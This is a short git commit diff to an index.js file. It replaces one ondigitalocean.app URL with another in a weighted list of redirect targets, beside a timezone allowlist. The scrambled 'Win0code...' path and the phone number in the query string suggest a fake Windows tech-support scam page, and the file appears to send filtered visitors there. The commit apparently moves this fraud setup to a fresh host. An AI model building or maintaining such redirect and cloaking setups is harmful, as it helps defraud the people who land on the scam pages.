28b8ce74a51f13cea2eb0c0a691582d22128e866
paalakash <palaksh452@gmail.com>
2026-06-14 10:46:10 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://whale-app-kip6h.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3791", weight: 1.0 }
+    { url: "https://sea-lion-app-3-kovqx.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3791", weight: 1.0 }
 
 ];
 
